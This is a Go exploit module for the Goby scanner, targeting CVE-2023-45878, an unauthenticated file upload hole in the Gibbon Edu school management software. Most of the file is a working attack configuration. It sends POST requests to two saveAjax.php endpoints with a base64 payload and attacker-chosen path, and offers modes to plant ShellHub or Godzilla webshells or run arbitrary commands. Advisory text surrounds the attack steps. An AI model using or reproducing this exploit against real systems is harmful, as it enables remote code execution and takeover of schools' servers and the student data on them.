package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Gibbon /modules/Rubrics/rubrics_visualise_saveAjax.php File Upload Vulnerability(CVE-2023-45878)",
    "Description": "<p>Gibbon Edu is an open-source educational software designed for schools and institutions to manage administrative and academic processes. It offers a range of features aimed at facilitating communication, collaboration, and organization within the educational community. </p><p>Versions 21.0.0 to 25.0.0 of Gibbon Edu contain a file upload vulnerability in the rubrics_visualise_saveAjax.php file. Unauthenticated attackers can upload arbitrary files to the application and achieve remote code execution (RCE) on the underlying system. To exploit this vulnerability, attackers need to craft a fake image file and save it as a PHP file.</p>",
    "Product": "Gibbon",
    "Homepage": "https://gibbonedu.org/",
    "DisclosureDate": "2023-11-02",
    "PostTime": "2025-01-08",
    "Author": "lushuncheng@baimaohui.net",
    "FofaQuery": "body=\"window.Gibbon\" && body=\"window.Gibbon\"",
    "GobyQuery": "body=\"window.Gibbon\" && body=\"window.Gibbon\"",
    "Level": "2",
    "Impact": "<p>Gibbon has a file upload vulnerability that allows attackers to upload a webshell and gain control of the entire server.</p>",
    "Recommendation": "<p>Upgrade to version 26.0.0 or higher.4o</p>",
    "References": [
        "https://www.cve.org/CVERecord?id=CVE-2023-45878"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Godzilla,Command,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/modules/Rubrics/rubrics_visualise_saveAjax.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "img=image/png;readme,{{{CONTENT3}}}&path={{{FILENAME}}}&gibbonPersonID=0000000001"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH|define|variable|/{{{FILENAME}}}"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/modules/Rubrics/src/visualise_saveAjax.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "img=image/png;readme,{{{CONTENT3}}}&path={{{FILENAME}}}&gibbonPersonID=0000000001"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH|define|variable|/{{{FILENAME}}}"
            ]
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/modules/Rubrics/rubrics_visualise_saveAjax.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "img=image/png;readme,{{{CONTENT3}}}&path={{{FILENAME}}}&gibbonPersonID=0000000001"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH|define|variable|/{{{FILENAME}}}"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/modules/Rubrics/src/visualise_saveAjax.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "img=image/png;readme,{{{CONTENT3}}}&path={{{FILENAME}}}&gibbonPersonID=0000000001"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH|define|variable|/{{{FILENAME}}}"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2023-45878"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Gibbon /modules/Rubrics/rubrics_visualise_saveAjax.php 文件上传漏洞（CVE-2023-45878）",
            "Product": "Gibbon",
            "Description": "<p>Gibbon Edu 是一款开源的教育软件，专为学校和教育机构设计，用于管理行政和学术流程。它提供了一系列功能，旨在促进教育社区内部的沟通、协作和组织。</p><p>Gibbon Edu 21.0.0到25.0.0版本rubrics_visualise_saveAjax.php文件存在文件上传漏洞，未经身份验证的攻击者可以向该应用程序上传任意文件，并在底层系统上实现代码执行（RCE）。为了实现远程代码执行（RCE），攻击者需要伪造一个假图片文件，并将其保存为 PHP 文件。<br></p>",
            "Recommendation": "<p>更新到26.0.0以上版本</p>",
            "Impact": "<p>Gibbon存在文件上传漏洞，可通过上传webshell控制整个服务器</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Gibbon /modules/Rubrics/rubrics_visualise_saveAjax.php File Upload Vulnerability(CVE-2023-45878)",
            "Product": "Gibbon",
            "Description": "<p>Gibbon Edu is an open-source educational software designed for schools and institutions to manage administrative and academic processes. It offers a range of features aimed at facilitating communication, collaboration, and organization within the educational community.&nbsp;</p><p>Versions 21.0.0 to 25.0.0 of Gibbon Edu contain a file upload vulnerability in the rubrics_visualise_saveAjax.php file. Unauthenticated attackers can upload arbitrary files to the application and achieve remote code execution (RCE) on the underlying system. To exploit this vulnerability, attackers need to craft a fake image file and save it as a PHP file.<br></p>",
            "Recommendation": "<p>Upgrade to version 26.0.0 or higher.4o<br></p>",
            "Impact": "<p>Gibbon has a file upload vulnerability that allows attackers to upload a webshell and gain control of the entire server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|php",
        "VUL_URL": "define|variable|/modules/Rubrics/rubrics_visualise_saveAjax.php",
        "CONTENT3": "CONTENT|base64|{{{CONTENT}}}"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL",
        "CONTENT3"
    ],
    "EditType": "fast",
    "PocId": "9982"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }